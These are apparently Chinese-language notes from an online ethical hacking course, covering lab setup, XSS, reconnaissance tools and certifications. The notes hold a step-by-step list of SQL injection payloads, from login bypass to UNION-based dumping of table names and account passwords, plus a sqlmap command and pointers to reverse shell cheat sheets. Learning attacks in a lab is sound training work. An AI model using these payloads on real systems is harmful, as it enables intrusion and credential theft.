# udemy the-complete-ethical-hacking-course 笔记

## 黑客实验室

### [virtualbox](https://www.virtualbox.org/wiki/Downloads)

+ 安装 virtualbox
+ 安装 Extension Pack
  + 偏好设置/扩展/先-后加+
  + 减除network重建
教程的vbox里安装了
1. win10
2. kali 2019.2
3. kali 2019.4
4. metasplotable
5. google pixel 3

+ 安装 kali linux
  + https://www.kali.org/
  + https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/
## xss
DVWA

url 地址能在浏览器里执行的叫 XSS
    xss 只要客户骗受害者点击就能偷到用户的密码
    beff
sql 注入则是用户的提交能在服务器里执行
    黑客只能让服务器执行恶意的代码就可以了

## python
### 改 mac

## sql injection
### 原则
各种变化都离不开这些

+ metasploitable database: multilidae
+ test: select * from users where username = 'x' and password='1111' AND 1 =1 #'
    + 把原来 password='' 变成 'xx' and 1=1 #', 密码处填 "xx' and 1=1 #"
    + 如果能进,表明存在漏洞
+ hack: select * from users where username = 'admin' and password='1' OR 1 =1 #'
+ hack2: select * from users where username = 'admin'# and password='1' OR 1 =1 #'
+ hack3: http://url/login?username=admin'#&pass...
    + #要改成 %23
+ hack4: http://url/login?username=admin' union select * from accounts #&pass...
+ hack5: http://url/login?username=admin' order by 1 #&pass...
    + http://url/login?username=admin' order by 10 #&pass...
    + 一般写10就会报错,看错误就能知道表名什么的,可以回到 hack4
    + http://url/login?username=admin' union select 1,2,3,4,5 #&pass...
    + http://url/login?username=admin' union select 1,database(),user(),version(),5 #&pass...
+ hack6: union select 1,table_name,null,null,5 from information_schema.tables
    + union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'dbName'
+ hack7: union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'TbName'
    + hack7: union select 1,usename,password,is_admin,5 from accounts

### 工具

+ sqlmap
 sqlmap -u http://url/login?username=admin&pass...
 成功后可以看数据库的名/表名/列名/具体数据 详见使用说明
owasp zap
zap analysis

## certification

offensive security
+ oscp
+ oswp
EC council
+ CEH
+ ECSA

## anaconda python
2019年6月15日，清华大学开源软件镜像站宣布，经与 Anaconda, Inc. 的沟通，获得了镜像的授权，将于近期恢复 Anaconda 相关服务[20]。

essential
## web reconnaisessance(侦测)

### maltego

### metasploitable
robot.txt
dirb

### exploit-db

### https://github.com/TheRook/subbrute
### dvwa
Reverse tcp command
google Reverse shell commands
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

weevely
### website information gathering online

[Information-Gathering](http://www.securityidiots.com/Web-Pentest/Information-Gathering/Part-1-information-Gathering-with-websites.html)

+ [netcraft](https://toolbar.netcraft.com/site_report)
+ [yougetsignal](https://www.yougetsignal.com/tools/web-sites-on-web-server/)
+ <https://archive.org/>
+ whois lookup:
    + https://lookup.icann.org/lookup
    + http://whois.domaintools.com/

[其它](https://securitytrails.com/blog/top-20-intel-tools)